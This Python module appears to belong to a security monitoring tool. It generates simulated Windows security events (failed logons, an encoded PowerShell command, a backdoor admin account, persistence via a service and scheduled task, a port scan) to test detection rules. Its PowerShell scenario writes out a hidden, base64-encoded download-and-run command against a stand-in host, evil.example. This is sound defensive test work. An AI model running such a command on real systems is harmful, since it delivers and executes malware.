"""Attack scenario simulator.

Generates realistic Windows-style security events for the five detection
scenarios plus a benign baseline. Used for testing, verification and demo
runs without endangering the host machine.

Every simulated record uses the exact same schema as the real collectors
so the whole pipeline (normalizer -> detection -> MITRE -> reports) is
exercised with realistic data.
"""
from __future__ import annotations

import base64
import logging
import random
import re
import time
from datetime import datetime, timedelta, timezone

from backend.collectors.base import BaseCollector

logger = logging.getLogger("sentinel.collectors.simulator")

COMMON_USERS = ["alice", "bob", "carol", "dave", "erin"]
ADMIN_GROUP_SIDS = {"S-1-5-32-544", "S-1-5-32-551"}


def _now_iso(offset_seconds: float = 0.0) -> str:
    ts = datetime.now(timezone.utc) + timedelta(seconds=offset_seconds)
    return ts.isoformat()


def _b64_payload(text: str) -> str:
    return base64.b64encode(text.encode("utf-16-le")).decode("ascii")


# ---------------------------------------------------------------------------
# Scenario generators
# ---------------------------------------------------------------------------
def gen_brute_force(account: str = "administrator", attempts: int = 12, span_seconds: int = 60, source_ip: str = "192.168.99.77") -> list[dict]:
    """Repeated 4625 failed logons to one account within a short window."""
    out = []
    step = span_seconds / attempts
    for i in range(attempts):
        out.append({
            "source": "eventlog",
            "channel": "Security",
            "event_id": 4625,
            "timestamp": _now_iso(-i * step),
            "user": account,
            "message": (
                f"An account failed to log on. Account Name: {account}. "
                f"Source Network Address: {source_ip}. Logon Type: 3. "
                f"Sub Status: 0xC000006A. Failure Reason: Unknown user name or bad password."
            ),
            "raw": {
                "logon_type": 3,
                "source_ip": source_ip,
                "workstation": "ATTACK-HOST",
                "sub_status": "0xC000006A",
            },
        })
    # A few successes from legitimate users to keep the timeline realistic.
    for u in random.sample(COMMON_USERS, 2):
        out.append(gen_logon_success(u)[0])
    return out


def gen_logon_success(user: str = "alice", logon_type: int = 2) -> list[dict]:
    return [{
        "source": "eventlog",
        "channel": "Security",
        "event_id": 4624,
        "timestamp": _now_iso(),
        "user": user,
        "message": f"An account was successfully logged on. Account Name: {user}. Logon Type: {logon_type}.",
        "raw": {"logon_type": logon_type, "source_ip": "127.0.0.1"},
    }]


def gen_suspicious_powershell(command: str | None = None) -> list[dict]:
    """Event 4104 script block logging with an encoded download-execute payload."""
    payload_text = "Invoke-WebRequest -Uri http://evil.example/payload.exe -OutFile $env:TEMP\\p.exe; Start-Process $env:TEMP\\p.exe"
    if command is None:
        encoded = _b64_payload(payload_text)
        command = f"powershell.exe -NoP -NonI -W Hidden -EncodedCommand {encoded}"
    payload = re.search(r"-EncodedCommand\s+(\S+)", command, re.IGNORECASE)
    script = f"$b=[Convert]::FromBase64String('{payload.group(1)}');$s=[Text.Encoding]::Unicode.GetString($b);Invoke-Expression $s" if payload else command

    decoded = ""
    if payload:
        try:
            decoded = base64.b64decode(payload.group(1), validate=False).decode("utf-16-le", errors="ignore")
        except Exception:  # noqa: BLE001
            decoded = payload_text

    return [{
        "source": "powershell",
        "channel": "Microsoft-Windows-PowerShell/Operational",
        "event_id": 4104,
        "timestamp": _now_iso(),
        "user": random.choice(COMMON_USERS),
        "message": f"Creating Scriptblock text (1 of 1): {script}",
        "raw": {
            "script_block": script,
            "command_line": command,
            "decoded_payload": decoded,
            "has_encoded": bool(payload),
            "has_download": (
                "DownloadString" in decoded
                or "WebClient" in decoded
                or "Invoke-WebRequest" in decoded
                or "DownloadFile" in decoded
            ),
            "has_hidden": bool(re.search(r"-W\s+Hidden|WindowStyle\s+Hidden", command, re.IGNORECASE)),
        },
    }]


def gen_privilege_escalation(new_admin: str = "backdoor_admin", attacker_user: str = "erin") -> list[dict]:
    """Account creation (4720) followed by membership in Administrators (4732)."""
    return [
        {
            "source": "eventlog",
            "channel": "Security",
            "event_id": 4720,
            "timestamp": _now_iso(-45),
            "user": attacker_user,
            "message": (
                f"A user account was created. Account Name: {new_admin}. "
                f"Account Domain: WORKSTATION. Subject: {attacker_user}."
            ),
            "raw": {"new_account": new_admin, "subject": attacker_user},
        },
        {
            "source": "eventlog",
            "channel": "Security",
            "event_id": 4732,
            "timestamp": _now_iso(-30),
            "user": attacker_user,
            "message": (
                f"A member was added to a security-enabled local group. "
                f"Member: {new_admin}. Group: Administrators. Subject: {attacker_user}."
            ),
            "raw": {"new_account": new_admin, "group_sid": "S-1-5-32-544", "group": "Administrators"},
        },
        {
            "source": "eventlog",
            "channel": "Security",
            "event_id": 4672,
            "timestamp": _now_iso(-10),
            "user": new_admin,
            "message": "Special privileges assigned to new logon. Account Name: " + new_admin + ".",
            "raw": {},
        },
    ]


def gen_persistence(new_service: str = "WindowsUpdateSvc", binary: str = "C:\\Users\\Public\\svchost.exe", scheduled_task: str = "PersistenceTask") -> list[dict]:
    """New service (7045) + scheduled task (4698) pointing at suspicious binaries."""
    return [
        {
            "source": "eventlog",
            "channel": "System",
            "event_id": 7045,
            "timestamp": _now_iso(-120),
            "user": "SYSTEM",
            "message": (
                f"A service was installed in the system. Service Name: {new_service}. "
                f"Service File Name: {binary}. Service Type: user mode service."
            ),
            "raw": {"service_name": new_service, "image_path": binary},
        },
        {
            "source": "eventlog",
            "channel": "Security",
            "event_id": 4698,
            "timestamp": _now_iso(-60),
            "user": "erin",
            "message": (
                f"A scheduled task was created. Task Name: {scheduled_task}. "
                f"Task Content: Executes {binary} at user logon."
            ),
            "raw": {"task_name": scheduled_task, "image_path": binary},
        },
    ]


def gen_port_scan(source_ip: str = "192.168.99.66", target_ip: str = "10.0.0.4", ports: int = 30) -> list[dict]:
    """Connection attempts to many distinct ports of one host (T1046)."""
    out = []
    for i in range(ports):
        out.append({
            "source": "network",
            "pid": 4422,
            "process": "nmap.exe",
            "local_ip": source_ip,
            "local_port": 40000 + i,
            "remote_ip": target_ip,
            "remote_port": 1 + (i * 137) % 65535,
            "state": "SYN_SENT",
            "is_listening": False,
            "timestamp": _now_iso(-i * 1.5),
        })
    return out


def gen_baseline_events(n: int = 40) -> list[dict]:
    """Realistic benign daily activity."""
    out: list[dict] = []
    users = COMMON_USERS[:]
    for _ in range(n):
        kind = random.random()
        user = random.choice(users)
        if kind < 0.55:
            out.append(gen_logon_success(user, random.choice([2, 2, 2, 3]))[0])
        elif kind < 0.75:
            out.append({
                "source": "eventlog", "channel": "Security", "event_id": 4688,
                "timestamp": _now_iso(-random.uniform(0, 1800)),
                "user": user,
                "message": "A new process has been created. New Process Name: " + random.choice([
                    "C:\\Windows\\System32\\notepad.exe",
                    "C:\\Windows\\System32\\calc.exe",
                    "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
                    "C:\\Windows\\explorer.exe",
                    "C:\\Windows\\System32\\cmd.exe",
                ]) + ".",
                "raw": {},
            })
        elif kind < 0.85:
            out.append(gen_logon_failure_random())
        else:
            out.append({
                "source": "network",
                "pid": 1234, "process": "chrome.exe",
                "local_ip": "192.168.1.20", "local_port": 50000,
                "remote_ip": "8.8.8.8", "remote_port": 443, "state": "ESTABLISHED",
                "is_listening": False, "timestamp": _now_iso(-random.uniform(0, 900)),
            })
    return out


def gen_logon_failure_random() -> dict:
    return {
        "source": "eventlog", "channel": "Security", "event_id": 4625,
        "timestamp": _now_iso(-random.uniform(0, 1800)),
        "user": random.choice(COMMON_USERS),
        "message": "An account failed to log on. Account Name: " + random.choice(COMMON_USERS) + ".",
        "raw": {"source_ip": "192.168.1.10", "logon_type": 2},
    }


class AttackSimulator(BaseCollector):
    """Runs the full simulated attack suite in a controlled sequence."""

    name = "simulator"
    SCENARIOS = {
        "brute_force": gen_brute_force,
        "powershell": gen_suspicious_powershell,
        "privilege_escalation": gen_privilege_escalation,
        "persistence": gen_persistence,
        "port_scan": gen_port_scan,
        "baseline": gen_baseline_events,
    }

    def collect(self) -> list[dict]:
        """Generate one complete attack suite (all scenarios + baseline)."""
        records: list[dict] = []
        records += gen_brute_force()
        records += gen_suspicious_powershell()
        records += gen_privilege_escalation()
        records += gen_persistence()
        records += gen_port_scan()
        records += gen_baseline_events(60)
        # Shuffle but keep timestamps meaningful.
        random.shuffle(records)
        self.logger.info("Simulated attack suite: %d records", len(records))
        return records

    def scenario(self, name: str) -> list[dict]:
        if name in (None, "", "full"):
            return self.collect()
        if name not in self.SCENARIOS:
            raise KeyError(f"Unknown scenario: {name}. Available: {list(self.SCENARIOS)}")
        return self.SCENARIOS[name]()
